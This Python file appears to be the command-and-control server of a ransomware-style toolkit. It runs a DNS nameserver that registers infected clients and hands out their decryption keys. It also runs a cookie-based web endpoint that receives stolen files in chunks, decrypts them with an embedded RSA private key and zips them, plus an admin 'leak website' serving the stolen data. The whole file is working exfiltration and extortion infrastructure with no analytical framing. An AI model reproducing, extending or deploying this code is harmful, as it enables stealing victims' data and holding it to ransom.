import logging
from base64 import b64encode
from json import dumps, loads
from os import getcwd
from io import BytesIO
from base64 import b64decode
from os.path import join

from mwutils.command_and_control.dns import dns_factory

from mwutils.command_and_control.asymmetric_cryptography import rsa_dec
from mwutils.command_and_control.helper import domainsafe_b64decode
from mwutils.command_and_control.symmetric_cryptography import aes256_encrypt
from mwutils.command_and_control.helper import Packet, unpack_packet
from mwutils.server.datastorage import write_file_to_zip
from mwutils.server.db import connect_to_database

from sqlalchemy.orm import Session


clients_in_progress = {}
exfil_sessions = {}

DATABASE=join(getcwd(), "database.db")
Client, engine = connect_to_database(DATABASE)
DATASTORAGE = join(getcwd(), "storage")

priv = """-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----"""

def use_logger():
    format="%(filename)-10s %(name)-10s %(levelno)-2s %(funcName)-10s [%(message)s]"
    logging.basicConfig(level=logging.INFO, format=format)
    format = logging.Formatter(format)

    for pkg_module in ["mwutils", "mwutils.command_and_control"]:
        pkg_logger = logging.getLogger(pkg_module)
        pkg_logger.addHandler(logging.StreamHandler())
        pkg_logger.setLevel(logging.INFO)
        pkg_logger.handlers[1].setFormatter(format)

    logger = logging.getLogger(__name__)
    logger.addHandler(logging.StreamHandler())
    logger.setLevel(logging.INFO)


def dns_logic(args):
    """Logic for the dns nameserver"""
    global clients_in_progress
    logging.info("dns args: %s", args)

    with Session(engine) as session:

        # example.com -> Register new client, returns guid
        if args == [""]:
            client = Client()
            session.add(client)
            session.commit()
            return client.guid

        # <data>.update.example.com -> ["<guid>", "update"] -> get client key for decryption
        elif len(args) == 2 and args[-1] == "update":
            found_client = session.query(Client).filter_by(guid=args[0], decrypt=True).first()
            if found_client is None:
                return ""
            return b64encode(found_client.key).decode("ascii")

        # <data>.<guid>.example.com -> ["<data>", "<guid>"] -> collect client information (return key)
        elif len(args) == 2:
            data, guid = args

            # check if exists in db and info is empty (meaning it's still in progress)
            found_client = session.query(Client).filter_by(guid=guid, info="").first()
            if found_client is not None:
                # decode data b64 -> bytes
                data:bytes = domainsafe_b64decode(data)
                packet:Packet = unpack_packet(data)

                if guid not in clients_in_progress:
                    clients_in_progress[guid] = [packet]
                else:
                    if packet.eof is False:
                        clients_in_progress[guid].append(packet)
                        return ""
                    message:bytes = b""
                    for packet in clients_in_progress.pop(guid):
                        message += packet.message_chunk

                    message = BytesIO(message)
                    # 512 16 16 <lenght message>
                    encrypted_session_key, nonce, tag, ciphertext = message.read(512), message.read(16), message.read(16), message.read()
                    message = rsa_dec(priv, encrypted_session_key, nonce, tag, ciphertext)

                    info = loads(message.decode("utf-8"))
                    session_key = b64decode(info["session_key"])
                    info.pop("session_key", None)
                    found_client.info = dumps(info)
                    session.commit()
                                       
                    nonce, ciphertext, tag = aes256_encrypt(session_key, found_client.key)
                    response = {
                        "nonce": b64encode(nonce).decode("ascii"),
                        "ciphertext": b64encode(ciphertext).decode("ascii"),
                        "tag": b64encode(tag).decode("ascii"),
                        }
                    return b64encode(dumps(response, separators=(',', ':')).encode("utf-8")).decode("ascii")# encrypt key

        return ""

def cookie_logic(cookie_jar:dict): # pylint: disable=W0613
    global exfil_sessions
    guid, data = list(cookie_jar.items())[0]
    logging.info("cookie guid: %s", guid)
    found_client = None
    with Session(engine) as session:
        # check for existing client
        found_client = session.query(Client).filter_by(guid=guid).first()
    if not found_client is None:
        packet = unpack_packet(b64decode(data))

        prefix, data =  b64decode(packet.prefix).decode("utf-8"), packet.message_chunk
        if exfil_sessions.get(guid):
            if exfil_sessions[guid].get(prefix):
                if packet.eof is False:
                        exfil_sessions[guid][prefix].append(data)
                else:
                    data = b""
                    for chunk in exfil_sessions[guid].pop(prefix):
                        data += chunk
                    # Decrypt data
                    data = BytesIO(data)
                    # 512 16 16 <lenght message>
                    encrypted_session_key, nonce, tag, ciphertext = data.read(512), data.read(16), data.read(16), data.read()
                    data = rsa_dec(priv, encrypted_session_key, nonce, tag, ciphertext)
                    write_file_to_zip(join(DATASTORAGE, f"{guid}.zip"), prefix, data)
            else:
                exfil_sessions[guid][prefix] = [data]
        else:
            exfil_sessions[guid] = {prefix:[data]}
    return {}


def exfiltration() -> None:
    from mwutils.command_and_control import web_protocols
    exfil_server = web_protocols.webserver_factory(cookie_logic)
    exfil_server.run("0.0.0.0", port=80, debug=False)

def web() -> None:
    global DATASTORAGE, DATABASE
    from mwutils.server import webserver
    web_server = webserver.webserver_factory(path_to_db=DATABASE, leaked_data_storage=DATASTORAGE)
    web_server.run("0.0.0.0", port=8080, debug=False)

def dns() -> None:
    dnsnameserver = dns_factory(func=dns_logic)
    dnsnameserver.run()


if __name__ == "__main__":

    # use_logger()
    
    logging.info("Starting Server")

    from multiprocessing import Process, set_start_method
    set_start_method('spawn')
    # admin website / leak website
    process_web = Process(target=web)
    # information gathering, key exchange
    process_dns = Process(target=dns)
    # data exfiltration
    process_exfil = Process(target=exfiltration)

    process_web.start()
    process_exfil.start()
    process_dns.start()
